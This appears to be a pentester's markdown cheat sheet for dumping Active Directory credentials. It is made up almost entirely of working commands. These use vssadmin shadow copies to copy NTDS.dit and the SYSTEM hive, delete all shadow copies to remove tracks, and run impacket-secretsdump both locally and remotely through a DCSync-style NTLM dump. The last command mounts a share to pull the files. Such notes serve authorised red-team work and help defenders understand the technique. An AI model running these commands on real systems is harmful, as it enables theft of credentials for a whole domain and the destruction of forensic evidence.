# Dump AD
## Manual
#### List shadow volume
```bat
vssadmin list shadows
```

#### Create shadow volume
```bat
vssadmin create shadow /for=C:
```

#### Copy shadow volume
```bat
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM c:\
```

#### Delete tracks
```bat
vssadmin delete shadows /all
vssadmin Resize ShadowStorage /For=C: /On=C: /MaxSize=300MB
```

## Impacket
### impacket local
After get the ntds.dit, sam and system:
```bash
impacket-secretsdump -ntds /root/Documents/ad/ntds.dit  -system /root/Documents/ad/system LOCAL -outputfile /root/Documents/ad/hashes_active
```

### impacket remote
```bash
impacket-secretsdump -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```


#### Extract files using mount
```bash
mount.cifs -v //PATH/ntds /mnt -o user=username
```
